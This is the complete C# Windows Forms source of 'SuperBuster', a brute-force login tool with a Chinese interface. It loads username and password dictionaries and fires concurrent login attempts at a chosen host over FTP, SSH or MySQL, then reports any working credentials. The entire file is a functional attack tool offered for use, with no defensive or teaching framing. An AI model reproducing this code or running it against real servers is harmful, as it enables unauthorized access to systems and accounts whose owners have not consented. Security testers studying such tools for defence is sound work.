﻿using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.IO;
using System.Threading;
using Renci.SshNet;
using MySql.Data.MySqlClient;

namespace SuperBuster
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
            CheckForIllegalCrossThreadCalls = false;
        }
        string[] users;
        string[] passwords;
        string host;
        bool ftp;
        bool ssh;
        bool mysql;
        private void button1_Click(object sender, EventArgs e)
        {

            Thread thread1 = new Thread(new ThreadStart(IncludeUser));
            thread1.ApartmentState = ApartmentState.STA;
            thread1.Start();
        }
        private void IncludeUser()
        {
            label2.Text = "正在导入用户名字典......";
            openFileDialog1.Filter = "文本文档|*.txt";
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                users = File.ReadAllLines(openFileDialog1.FileName);
                int i = 0;
                richTextBox1.Clear();
                while (i < users.Length)
                {
                    richTextBox1.Text += users[i] + "\r";
                    i++;
                }
                label2.Text = "用户名字典已导入！";
            }
            else
            {
                label2.Text = "导入已取消！";
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Thread thread2 = new Thread(new ThreadStart(IncludePassword));
            thread2.ApartmentState = ApartmentState.STA;
            thread2.Start();
        }
        private void IncludePassword()
        {
            label2.Text = "正在导入密码字典......";
            openFileDialog1.Filter = "文本文档|*.txt";
            if (openFileDialog1.ShowDialog() == DialogResult.OK)
            {
                passwords = File.ReadAllLines(openFileDialog1.FileName);
                int i = 0;
                richTextBox2.Clear();
                while (i < passwords.Length)
                {
                    richTextBox2.Text += passwords[i] + "\r";
                    i++;
                }
                label2.Text = "密码字典已导入！";
            }
            else
            {
                label2.Text = "导入已取消！";
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            if (textBox1.Text=="")
            {
                MessageBox.Show("请输入目标主机！", "提示");
            }
            else if(richTextBox1.Text=="")
            {
                MessageBox.Show("请导入用户名字典！", "提示");
            }
            else if(richTextBox2.Text=="")
            {
                MessageBox.Show("请导入密码字典！", "提示");
            }
            else if(button3.Text=="停止爆破")
            {
                button3.Text = "开始爆破";
                label2.Text = "";
                ftp = false;
                ssh = false;
                mysql = false;
                textBox1.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                radioButton1.Enabled = true;
                radioButton2.Enabled = true;
                radioButton3.Enabled = true;
                richTextBox3.Text += "爆破结束！当前字典无正确用户名密码！";
                MessageBox.Show("爆破结束！当前字典无正确用户名密码！", "提示");
            }
            else
            {
                host = textBox1.Text;
                if (radioButton1.Checked)
                {
                    textBox1.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    radioButton1.Enabled = false;
                    radioButton2.Enabled = false;
                    radioButton3.Enabled = false;
                    richTextBox3.Clear();
                    label2.Text = "正在进行FTP爆破......";
                    MessageBox.Show("开始FTP爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread2 = new Thread(new ThreadStart(FTPBomb));
                    thread2.Start();
                }
                else if (radioButton2.Checked)
                {
                    textBox1.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    radioButton1.Enabled = false;
                    radioButton2.Enabled = false;
                    radioButton3.Enabled = false;
                    richTextBox3.Clear();
                    label2.Text = "正在进行SSH爆破......";
                    MessageBox.Show("开始SSH爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread3 = new Thread(new ThreadStart(SSHBomb));
                    thread3.Start();
                }
                else if (radioButton3.Checked)
                {
                    textBox1.Enabled = false;
                    button1.Enabled = false;
                    button2.Enabled = false;
                    radioButton1.Enabled = false;
                    radioButton2.Enabled = false;
                    radioButton3.Enabled = false;
                    richTextBox3.Clear();
                    label2.Text = "正在进行MySQL爆破......";
                    MessageBox.Show("开始MySQL爆破！", "提示");
                    button3.Text = "停止爆破";
                    Thread thread4 = new Thread(new ThreadStart(MySQLBomb));
                    thread4.Start();
                }
                else
                {
                    MessageBox.Show("请选择协议！", "提示");
                }
            }            
        }
        private void FTPBomb()
        {
            ftp = true;
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for(int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        bool result = FTPRequest(host,users[l],passwords[Y]);
                        if (result)
                        {
                            BeginInvoke(new Action(() =>
                            {
                                if(ftp)
                                {
                                    ftp = false;
                                    richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                    button3.Text = "开始爆破";
                                    label2.Text = "";
                                    richTextBox3.Text += "爆破结束！";
                                    textBox1.Enabled = true;
                                    button1.Enabled = true;
                                    button2.Enabled = true;
                                    radioButton1.Enabled = true;
                                    radioButton2.Enabled = true;
                                    radioButton3.Enabled = true;
                                    MessageBox.Show("爆破结束！用户名："+users[l]+"密码："+passwords[Y], "提示");
                                }
                            }));
                        }
                        else
                        {
                            BeginInvoke(new Action(() =>
                            {
                                if(ftp)
                                {
                                    richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                }
                            }));
                        }
                    }));
                }              
            }
            Task.WaitAll(TaskList.ToArray());
            if (ftp)
            {
                button3.Text = "开始爆破";
                label2.Text = "";
                richTextBox3.Text += "爆破结束！当前字典无正确用户名密码！";
                textBox1.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                radioButton1.Enabled = true;
                radioButton2.Enabled = true;
                radioButton3.Enabled = true;
                MessageBox.Show("爆破结束！当前字典无正确用户名密码！", "提示");
            }
        }
        private bool FTPRequest(string host,string user,string password)
        {
            FtpWebRequest FTP = (FtpWebRequest)WebRequest.Create(new Uri("ftp://" + host));
            FTP.Method = WebRequestMethods.Ftp.ListDirectory;
            FTP.UseBinary = true;
            FTP.Credentials = new NetworkCredential(user, password);
            try
            {
                FtpWebResponse response = (FtpWebResponse)FTP.GetResponse();
                return true;
            }
            catch
            {
                return false;
            }
        }
        private void SSHBomb()
        {
            ssh = true;
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        bool result = SSHRequest(host, users[l], passwords[Y]);
                        if (result)
                        {
                            BeginInvoke(new Action(() =>
                            {
                                if(ssh)
                                {
                                    ssh = false;
                                    richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                    button3.Text = "开始爆破";
                                    label2.Text = "";
                                    richTextBox3.Text += "爆破结束！";
                                    textBox1.Enabled = true;
                                    button1.Enabled = true;
                                    button2.Enabled = true;
                                    radioButton1.Enabled = true;
                                    radioButton2.Enabled = true;
                                    radioButton3.Enabled = true;
                                    MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                }
                            }));
                        }
                        else
                        {
                            BeginInvoke(new Action(() =>
                            {
                                if (ssh)
                                {
                                    richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                }
                            }));
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            if (ssh)
            {
                button3.Text = "开始爆破";
                label2.Text = "";
                richTextBox3.Text += "爆破结束！当前字典无正确用户名密码！";
                textBox1.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                radioButton1.Enabled = true;
                radioButton2.Enabled = true;
                radioButton3.Enabled = true;
                MessageBox.Show("爆破结束！当前字典无正确用户名密码！", "提示");
            }
        }
        private bool SSHRequest(string host, string user, string password)
        {
            var SSH = new SshClient(host, user, password);
            try
            {                
                SSH.Connect();
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                SSH.Disconnect();
            }
        }
        private void MySQLBomb()
        {
            mysql = true;
            List<Task> TaskList = new List<Task>();
            for (int i = 0; i < users.Length; i++)
            {
                int l = i;
                for (int y = 0; y < passwords.Length; y++)
                {
                    int Y = y;
                    TaskList.Add(Task.Factory.StartNew(() =>
                    {
                        bool result = MySQLRequest(host, users[l], passwords[Y]);
                        if (result)
                        {
                            BeginInvoke(new Action(() =>
                            {
                                if(mysql)
                                {
                                    mysql = false;
                                    richTextBox3.Text += "爆破成功！用户名：" + users[l] + " 密码：" + passwords[Y] + "\r";
                                    button3.Text = "开始爆破";
                                    label2.Text = "";
                                    richTextBox3.Text += "爆破结束！";
                                    textBox1.Enabled = true;
                                    button1.Enabled = true;
                                    button2.Enabled = true;
                                    radioButton1.Enabled = true;
                                    radioButton2.Enabled = true;
                                    radioButton3.Enabled = true;
                                    MessageBox.Show("爆破结束！用户名：" + users[l] + "密码：" + passwords[Y], "提示");
                                }
                            }));
                        }
                        else
                        {
                            BeginInvoke(new Action(() =>
                            {
                                if (mysql)
                                {
                                    richTextBox3.Text += "正在爆破！当前用户名：" + users[l] + " 当前密码：" + passwords[Y] + "\r";
                                }
                            }));
                        }
                    }));
                }
            }
            Task.WaitAll(TaskList.ToArray());
            Thread.Sleep(1000);
            if (mysql)
            {
                button3.Text = "开始爆破";
                label2.Text = "";
                richTextBox3.Text += "爆破结束！当前字典无正确用户名密码！";
                textBox1.Enabled = true;
                button1.Enabled = true;
                button2.Enabled = true;
                radioButton1.Enabled = true;
                radioButton2.Enabled = true;
                radioButton3.Enabled = true;
                MessageBox.Show("爆破结束！当前字典无正确用户名密码！", "提示");
            }
        }
        private bool MySQLRequest(string host, string user, string password)
        {
            string a = "server=" + host + ";port=3306;uid=" + user + ";pwd=" + password+ ";"+ "SslMode = none;";
            MySqlConnection conn = new MySqlConnection(a);
            try
            {
                conn.Open();
                return true;
            }
            catch
            {
                return false;
            }
            finally
            {
                conn.Close();
            }
        }
        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Environment.Exit(0);
        }

        private void linkLabel1_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            System.Diagnostics.Process.Start("https://github.com/7hr0wer/SuperBuster");
        }

        private void linkLabel2_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
        {
            MessageBox.Show("邮箱反馈：thrower@thrower.cc", "提示");
        }
    }
}